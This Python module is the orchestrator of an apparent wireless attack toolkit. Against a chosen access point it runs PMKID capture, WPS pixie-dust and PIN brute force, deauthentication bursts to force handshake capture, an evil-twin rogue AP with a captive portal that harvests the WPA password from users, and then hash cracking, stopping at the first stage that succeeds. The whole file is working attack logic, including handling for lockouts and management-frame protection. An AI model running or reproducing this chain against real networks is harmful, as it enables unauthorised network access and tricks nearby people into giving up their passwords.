"""OMNI adaptive attack chain orchestrator.

Given a locked target AccessPoint, tries stages in order and stops at
the first one that yields crackable material, then cracks it.

Chain: PROFILE -> PMKID -> WPS -> HANDSHAKE -> EVILTWIN -> ONLINE ->
CRACK -> DONE. WPS and EVILTWIN are real, implemented stages. ONLINE
(budgeted PIN/password guessing) is still a skip-stub, kept in the
chain only to preserve the stage shape for when it lands.

Single-adapter by design. A dual-Alfa split listen/attack mode is an
open idea (STATUS.md "Ideas / undecided"), not assumed here.

Every stage body that touches the network is dependency-injected
(pmkid_fn/handshake_fn/deauth_fn/cracker) so orchestration logic can be
unit-tested without hardware.
"""

from __future__ import annotations

import threading
import time
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path

from .attacks.deauth import deauth as _default_deauth
from .attacks.handshake import HandshakeCapture, HandshakeStatus, capture_handshake as _default_capture_handshake
from .attacks.pmkid import capture_pmkid as _default_capture_pmkid
from .attacks.wps import wps_pin_bruteforce as _default_wps_bruteforce
from .attacks.wps import pixie_attempt as _default_pixie_attempt
from .attacks.eviltwin import run_eviltwin as _default_eviltwin
from .crack.base import Cracker
from .crack.convert import cap_to_22000
from .frames import BROADCAST
from .radio import get_mac
from .scan import AccessPoint


class StageResult(Enum):
    """Outcome of one OMNI stage."""

    SUCCESS = "success"
    SKIPPED = "skipped"
    FAILED = "failed"


@dataclass
class StageReport:
    """One stage's outcome and a short human-readable reason."""

    name: str
    result: StageResult
    detail: str = ""


@dataclass
class OmniReport:
    """Full per-target run: stage-by-stage trail plus any crack results."""

    target: str
    stages: list[StageReport] = field(default_factory=list)
    hash_lines: list[str] = field(default_factory=list)
    cracked: dict[str, str] = field(default_factory=dict)

    def summary(self) -> str:
        """Render a per-stage report."""
        lines = [f"OMNI report for {self.target}"]
        for s in self.stages:
            detail = f": {s.detail}" if s.detail else ""
            lines.append(f"  [{s.result.value:7}] {s.name}{detail}")
        if self.cracked:
            lines.append(f"  CRACKED: {self.cracked}")
        return "\n".join(lines)


class OmniOrchestrator:
    """Adaptive per-target attack chain with first-success short-circuit."""

    HANDSHAKE_MAX_ROUNDS = 6
    HANDSHAKE_ROUND_INTERVAL = 15.0

    def __init__(
        self,
        iface: str,
        cracker: Cracker | None = None,
        capture_dir: str | Path = ".",
        pmkid_fn=_default_capture_pmkid,
        handshake_fn=_default_capture_handshake,
        deauth_fn=_default_deauth,
        wps_fn=_default_wps_bruteforce,
        pixie_fn=_default_pixie_attempt,
        eviltwin_fn=_default_eviltwin,
        iface_ap: str | None = None,
        stop_event: threading.Event | None = None,
        handshake_max_rounds: int | None = None,
        handshake_round_interval: float | None = None,
        listener_settle: float = 2.0,
    ):
        self.iface = iface
        self.cracker = cracker
        self.capture_dir = Path(capture_dir)
        self._pmkid_fn = pmkid_fn
        self._handshake_fn = handshake_fn
        self._deauth_fn = deauth_fn
        self._wps_fn = wps_fn
        self._pixie_fn = pixie_fn
        self._eviltwin_fn = eviltwin_fn
        self._iface_ap = iface_ap
        self._stop = stop_event or threading.Event()
        self.handshake_max_rounds = handshake_max_rounds or self.HANDSHAKE_MAX_ROUNDS
        self.handshake_round_interval = handshake_round_interval or self.HANDSHAKE_ROUND_INTERVAL
        self._listener_settle = listener_settle

    def stop(self) -> None:
        """Signal any in-progress stage loop (e.g. handshake rounds) to abort."""
        self._stop.set()

    def run(self, ap: AccessPoint, wordlist: str | None = None) -> OmniReport:
        """Run the adaptive chain against ap; return the full report."""
        report = OmniReport(target=ap.bssid)
        self._stage_profile(ap, report)

        if ap.security == "open":
            report.stages.append(
                StageReport("pmkid", StageResult.SKIPPED, "open network — nothing to crack")
            )
            return report

        if self._stage_pmkid(ap, report):
            self._stage_crack(report, wordlist)
            return report

        if self._stage_wps(ap, report):
            return report  # WPS success already populated report.cracked directly

        hs_status = self._stage_handshake(ap, report)

        self._stage_eviltwin(ap, report)
        self._stage_online(ap, report, material_captured=hs_status is HandshakeStatus.AUTHORIZED)

        self._stage_crack(report, wordlist)
        return report

    def run_smart(self, ap: AccessPoint, wordlist: str | None = None) -> OmniReport:
        """Quick attack: PMKID first, deauth only if PMF allows it, no
        WPS/EVILTWIN/ONLINE.

        A faster single-target subset of run() -- kept as its own entry
        point (not folded into run()) to preserve two distinct modes:
        full adaptive OMNI chain vs. a quick PMF-aware PMKID-then-deauth
        pass. Reuses run()'s own stage methods, so there's no duplicated
        attack logic between the two.
        """
        report = OmniReport(target=ap.bssid)
        self._stage_profile(ap, report)

        if ap.security == "open":
            report.stages.append(
                StageReport("pmkid", StageResult.SKIPPED, "open network — nothing to crack")
            )
            return report

        if self._stage_pmkid(ap, report):
            self._stage_crack(report, wordlist)
            return report

        if ap.pmf == "required":
            from .secure import recommend_attack

            pivot = recommend_attack(ap)
            report.stages.append(StageReport("handshake", StageResult.SKIPPED, pivot["reason"]))
            return report

        self._stage_handshake(ap, report)
        self._stage_crack(report, wordlist)
        return report

    # -- stages -----------------------------------------------------------

    def _stage_profile(self, ap: AccessPoint, report: OmniReport) -> None:
        detail = f"security={ap.security} pmf={ap.pmf}"
        report.stages.append(StageReport("profile", StageResult.SUCCESS, detail))

    def _stage_pmkid(self, ap: AccessPoint, report: OmniReport) -> bool:
        """Clientless PMKID attempt; True and records a hash line on success."""
        try:
            attacker_mac = get_mac(self.iface)
        except Exception as exc:  # radio lookup failure shouldn't crash the chain
            report.stages.append(StageReport("pmkid", StageResult.FAILED, str(exc)))
            return False

        for attempt in range(2):
            if self._stop.is_set():
                report.stages.append(StageReport("pmkid", StageResult.SKIPPED, "stopped"))
                return False
            line = self._pmkid_fn(
                self.iface, bssid=ap.bssid, client=attacker_mac, channel=ap.channel, timeout=12.0
            )
            if line:
                report.hash_lines.append(line)
                report.stages.append(
                    StageReport("pmkid", StageResult.SUCCESS, f"attempt {attempt + 1}")
                )
                return True
        report.stages.append(StageReport("pmkid", StageResult.FAILED, "no PMKID in 2 attempts"))
        return False

    def _stage_wps(self, ap: AccessPoint, report: OmniReport) -> bool:
        """WPS attack chain: pixie-dust offline first, then split-half PIN bruteforce.

        Pixie-dust requires only one live M1→M3 exchange before going offline;
        if it finds the PIN it verifies via a second M1→M7 cycle. Falls through
        to bruteforce (11,000-attempt split-half sweep) on failure.

        AP Setup Locked (from M1) skips outright; a run of consecutive
        timeouts is treated as suspected rate-limiting/lockout and aborts
        early rather than exhausting the full attempt budget.
        """
        from .attacks.wps import AttemptOutcome

        if self._stop.is_set():
            report.stages.append(StageReport("wps", StageResult.SKIPPED, "stopped"))
            return False

        # Pixie-dust: one M1→M3 exchange + offline crack + optional M1→M7 verify
        pd_result = self._pixie_fn(self.iface, ap.bssid, ap.ssid or "", channel=ap.channel)
        if pd_result.outcome is AttemptOutcome.AP_SETUP_LOCKED:
            report.stages.append(StageReport("wps", StageResult.SKIPPED, "AP Setup Locked"))
            return False
        if pd_result.outcome is AttemptOutcome.SUCCESS:
            report.cracked[ap.bssid] = pd_result.network_key or ""
            report.stages.append(StageReport("wps", StageResult.SUCCESS, "pixie-dust"))
            return True

        # Fall through to online bruteforce
        if self._stop.is_set():
            report.stages.append(StageReport("wps", StageResult.SKIPPED, "stopped"))
            return False
        result = self._wps_fn(self.iface, ap.bssid, ap.ssid or "", channel=ap.channel, stop_event=self._stop)
        if result.ap_setup_locked:
            report.stages.append(StageReport("wps", StageResult.SKIPPED, "AP Setup Locked"))
            return False
        if result.aborted_lockout:
            report.stages.append(
                StageReport("wps", StageResult.FAILED, f"suspected lockout after {result.attempts} attempts")
            )
            return False
        if result.success:
            report.cracked[ap.bssid] = result.network_key or ""
            report.stages.append(
                StageReport("wps", StageResult.SUCCESS, f"PIN {result.pin} -> SSID={result.ssid!r}")
            )
            return True
        report.stages.append(StageReport("wps", StageResult.FAILED, f"exhausted after {result.attempts} attempts"))
        return False

    def _stage_handshake(self, ap: AccessPoint, report: OmniReport) -> HandshakeStatus:
        """Deauth rounds (count=1 discipline, 15s pacing) with a capture gate.

        Skipped outright when PMF is required (802.11w drops the deauths,
        so there's no point attempting the stage at all).
        """
        if ap.pmf == "required":
            report.stages.append(
                StageReport("handshake", StageResult.SKIPPED, "PMF required — deauth would be dropped")
            )
            return HandshakeStatus.NONE

        outfile = str(self.capture_dir / f"{ap.bssid.replace(':', '')}.pcap")
        result: dict[str, HandshakeCapture] = {}

        def run_capture() -> None:
            total_window = self.handshake_max_rounds * self.handshake_round_interval + 10.0
            result["cap"] = self._handshake_fn(
                self.iface, ap.bssid, channel=ap.channel, timeout=total_window, outfile=outfile,
                stop_event=self._stop,
            )

        listener = threading.Thread(target=run_capture)
        listener.start()
        time.sleep(self._listener_settle)  # let the sniffer settle before the first burst

        client = next(iter(ap.clients), BROADCAST)
        for round_no in range(1, self.handshake_max_rounds + 1):
            if self._stop.is_set():
                break
            cap = result.get("cap")
            if cap is not None and any(
                cap.authorized(a, c) for a, c in cap.messages
            ):
                break
            self._deauth_fn(self.iface, ap.bssid, client=client, count=1, channel=ap.channel)
            if self._stop.wait(self.handshake_round_interval):
                break

        listener.join(timeout=self.handshake_round_interval + 15.0)
        cap = result.get("cap")
        if cap is None or not cap.messages:
            report.stages.append(StageReport("handshake", StageResult.FAILED, "no EAPOL captured"))
            return HandshakeStatus.NONE

        best = HandshakeStatus.NONE
        for a, c in cap.messages:
            status = cap.status(a, c)
            if status is HandshakeStatus.AUTHORIZED:
                best = HandshakeStatus.AUTHORIZED
                break
            if status is HandshakeStatus.CHALLENGE and best is HandshakeStatus.NONE:
                best = HandshakeStatus.CHALLENGE

        if best is HandshakeStatus.AUTHORIZED:
            report.stages.append(StageReport("handshake", StageResult.SUCCESS, f"captured {outfile}"))
            report.hash_lines.append(outfile)  # resolved to 22000 lines in _stage_crack
        elif best is HandshakeStatus.CHALLENGE:
            report.stages.append(
                StageReport(
                    "handshake", StageResult.FAILED,
                    "CHALLENGE only (M1+M2, unverified) — not crackable-confirmed, kept trying",
                )
            )
        else:
            report.stages.append(StageReport("handshake", StageResult.FAILED, "no EAPOL captured"))
        return best

    def _stage_eviltwin(self, ap: AccessPoint, report: OmniReport) -> None:
        """Rogue AP + captive portal to harvest WPA-Personal password.

        Requires a second interface (iface_ap) in managed mode to host the AP.
        Skipped if no AP interface is configured.
        """
        if self._iface_ap is None:
            report.stages.append(
                StageReport("eviltwin", StageResult.SKIPPED, "no AP interface configured (set iface_ap)")
            )
            return
        if self._stop.is_set():
            report.stages.append(StageReport("eviltwin", StageResult.SKIPPED, "stopped"))
            return
        result = self._eviltwin_fn(
            iface_ap=self._iface_ap,
            iface_mon=self.iface,
            bssid=ap.bssid,
            ssid=ap.ssid or "",
            channel=ap.channel or 6,
            stop_event=self._stop,
        )
        if result.success and result.password:
            report.cracked[ap.bssid] = result.password
            report.stages.append(
                StageReport("eviltwin", StageResult.SUCCESS, f"password harvested: {result.detail}")
            )
        else:
            report.stages.append(
                StageReport("eviltwin", StageResult.FAILED, result.detail)
            )

    def _stage_online(self, ap: AccessPoint, report: OmniReport, material_captured: bool) -> None:
        """Stub: budgeted online PIN/password guessing not yet implemented.

        Also skips this stage once capture material already exists
        (_radio_material_captured) — preserved here even though the body
        is a stub, so the skip *reason* stays accurate once it's built.
        """
        if material_captured:
            report.stages.append(
                StageReport("online", StageResult.SKIPPED, "capture material already obtained")
            )
        else:
            report.stages.append(
                StageReport("online", StageResult.SKIPPED, "online guessing not implemented yet")
            )

    def _stage_crack(self, report: OmniReport, wordlist: str | None) -> None:
        """Batch dedupe collected material into one file and run the cracker."""
        lines: list[str] = []
        for item in report.hash_lines:
            if item.endswith(".pcap"):
                out22000 = item + ".22000"
                try:
                    cap_to_22000(item, out22000)
                except Exception as exc:
                    report.stages.append(StageReport("crack", StageResult.FAILED, str(exc)))
                    return
                lines.extend(Path(out22000).read_text().splitlines())
            else:
                lines.append(item)

        deduped = sorted(set(l for l in lines if l.strip()))
        if not deduped:
            report.stages.append(StageReport("crack", StageResult.SKIPPED, "no hash material"))
            return

        batch_path = self.capture_dir / f"{report.target.replace(':', '')}_{int(time.time())}.22000"
        batch_path.write_text("\n".join(deduped) + "\n")

        if self.cracker is None or wordlist is None:
            report.stages.append(
                StageReport("crack", StageResult.SKIPPED, f"material batched at {batch_path}, no cracker/wordlist given")
            )
            return

        try:
            results = self.cracker.crack(str(batch_path), wordlist)
        except Exception as exc:
            report.stages.append(StageReport("crack", StageResult.FAILED, str(exc)))
            return
        report.cracked.update(results)
        if results:
            report.stages.append(StageReport("crack", StageResult.SUCCESS, str(results)))
        else:
            report.stages.append(StageReport("crack", StageResult.FAILED, "wordlist exhausted"))
